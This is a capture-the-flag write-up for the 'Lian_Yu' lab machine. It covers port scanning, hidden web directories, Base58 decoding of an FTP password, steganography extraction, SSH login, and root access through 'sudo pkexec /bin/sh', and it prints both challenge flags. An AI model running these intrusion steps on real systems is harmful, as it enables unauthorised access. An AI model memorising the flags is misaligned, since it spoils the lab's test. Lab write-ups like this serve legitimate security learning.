# Lian_Yu

### #1 Deploy the VM and Start the Enumeration.
Just deploy the mashine.

### #2 What is the Web Directory you found?
nmap -sV -sC <ip>
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp  open  http    Apache httpd
111/tcp open  rpcbind 2-4 (RPC #100000)

Run dirbuster to see if there is some hidden folders on the webserver
```
dirbuster 
/island/ (This page gave me a code word) 
/island/2100
```
The /island page gave me a code word
```
Code Word is: 
vigilante
```
The web Directory we found
```
2100
```

### #3 what is the file name you found?
In the source code of /2100 there is a clue with the extention .ticket.
So we use dirbuster and search for files with the extention.

```
/island/2100/green_arrow.ticket
```

### #4 what is the FTP Password?
The file gave us:
``` 
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX 
```
Because its a "token", lets try to decode it.
```
sudo john thm/lian_Yu/codeFromGreenArrowFile.txt rockyou.txt
```
John diddnt give me anything..

Tryed some webpages and got this from Base64, everything else gave me nothing
```
E<¼Ê.PvÇ.
```

So maybe Base58 encoded?
```
!#th3h00d
```

### #5 what is the file name with SSH password?

Trying to logg into the ftp server using "The code word":
```
vigilante:!#th3h00d
```

Downloaded all the pictures, one of the pictures got a png header error.

```
hexeditor Leave_me_alone.png
```

Added the Png header
```
89  50  4e  47  0d  0a  1a  0a
```

The image gave me the password
```
password
```
Test if there is any hidden zip in the pictures
```
steghide extract -sf aa.jpg
password: password
```
Found a zip named ss.zip with two files, just tryed the filename as the answer to this question.
```
shado
```

### #6 User flag
Before when we were in the ftp server, checked if we could cd. Found another user, maybe the content of the shadofile was a password.
```
ssh slade:M3tahuman@<ip>
```
Cat out the user flag
```
cat /home/slade/user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

### #7 Root flag
Any files we can excecute as root without using password
```
sudo -l
(root) PASSWD: /usr/bin/pkexec
```
Exploit pkexec
```
sudo pkexec /bin/sh
```
Cat out the root flag
```
cat /root/root.txt
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```
